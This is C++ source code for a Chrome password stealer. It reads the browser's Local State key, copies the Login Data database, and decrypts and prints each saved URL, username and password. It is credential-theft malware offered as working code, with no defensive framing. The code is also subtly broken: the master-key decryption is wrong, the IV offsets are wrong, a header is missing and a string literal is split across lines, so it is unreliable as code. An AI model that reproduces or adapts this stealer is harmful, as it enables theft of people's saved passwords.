#include <iostream> 
#include <fstream> 
#include <string> 
#include <Windows.h> 
#include <filesystem> 
#include <openssl/aes.h> 
#include <openssl/evp.h> 
#include <cstdio> 
#include <cstring> 
#include <sstream> 
 
std::string get_master_key() { 
    std::ifstream file(std::getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"); 
    std::string local_state((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); 
    file.close(); 
 
    std::string encrypted_key = local_state.substr(local_state.find("\"os_crypt\":{\"encrypted_key\":\"") + 26); 
    encrypted_key = encrypted_key.substr(0, encrypted_key.find("\"")); 
 
    std::string decoded_key; 
    int decoded_len = 0; 
    std::unique_ptr<unsigned char[]> decoded_buf(new unsigned char[encrypted_key.length()+1]()); 
 
    std::stringstream ss; 
    ss << "echo " << decoded_buf.get() << " | certutil -decodehex " << decoded_key; 
    std::string cmd = ss.str(); 

    FILE* pipe = _popen(cmd.c_str(), "r"); 
    if (pipe) { 
        fgets(reinterpret_cast<char*>(decoded_buf.get()), encrypted_key.length() + 1, pipe); 
        decoded_len = strlen(reinterpret_cast<const char*>(decoded_buf.get())); 
        _pclose(pipe); 
    } 

    std::string master_key(decoded_len, '\0'); 
 
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new(); 
    const EVP_CIPHER* cipher = EVP_aes_128_ecb(); 
 
    EVP_DecryptInit_ex(ctx, cipher, nullptr, nullptr, nullptr); 
    EVP_DecryptUpdate(ctx, reinterpret_cast<unsigned char*>(master_key.data()), &decoded_len, reinterpret_cast<const unsigned char*>(decoded_buf.get()), decoded_len); 
    EVP_DecryptFinal_ex(ctx, reinterpret_cast<unsigned char*>(&master_key[0]), &decoded_len); 
    EVP_CIPHER_CTX_cleanup(ctx); 
    EVP_CIPHER_CTX_free(ctx); 
 
    master_key.resize(decoded_len); 
 
    return master_key; 
} 
 
std::string decrypt_password(const std::string& buff, const std::string& master_key) { 
    std::string iv = buff.substr(3, 15); 
    std::string payload = buff.substr(15); 
 
    unsigned char aes_key[16]; 
    memcpy(aes_key, master_key.data(), 16); 
 
    unsigned char iv_block[16]; 
    memcpy(iv_block, iv.data(), 16); 
 
    int output_size = payload.length(); 
    std::unique_ptr<unsigned char[]> decrypted_buf(new unsigned char[output_size]()); 
     
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new(); 
    const EVP_CIPHER* cipher = EVP_aes_128_gcm(); 
 
    EVP_DecryptInit_ex(ctx, cipher, nullptr, aes_key, iv_block); 
    EVP_DecryptUpdate(ctx, decrypted_buf.get(), &output_size, reinterpret_cast<const unsigned char*>(payload.data()), payload.length()); 
    EVP_DecryptFinal_ex(ctx, decrypted_buf.get() + output_size, &output_size); 
    EVP_CIPHER_CTX_cleanup(ctx); 
    EVP_CIPHER_CTX_free(ctx); 
 
    std::string decrypted_pass(reinterpret_cast<const char*>(decrypted_buf.get()), output_size - 16); // Removing suffix bytes 
 
    return decrypted_pass; 
} 
 
int main() { 
    std::string master_key = get_master_key(); 
    std::cout << "MASTER_KEY: " << master_key << std::endl; 
 
    std::string login_db = std::getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"; 
    std::filesystem::copy_file(login_db, "Loginvault.db", std::filesystem::copy_options::overwrite_existing); 
 
    sqlite3* db; 
    sqlite3_open("Loginvault.db", &db); 
 
    std::string query = "SELECT action_url, username_value, password_value FROM logins"; 
    sqlite3_stmt* stmt; 
    sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr); 
 
    while (sqlite3_step(stmt) == SQLITE_ROW) { 
        std::string url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))); 
        std::string username(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1))); 
        std::string encrypted_password(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2))); 
 
        std::string decrypted_password = decrypt_password(encrypted_password, master_key); 
        std::cout << "U
        RL: " << url << std::endl; 
        std::cout << "User Name: " << username << std::endl; 
        std::cout << "Password: " << decrypted_password << std::endl; 
        std::cout << std::string(50, '*') << std::endl; 
    }

    return 0;
}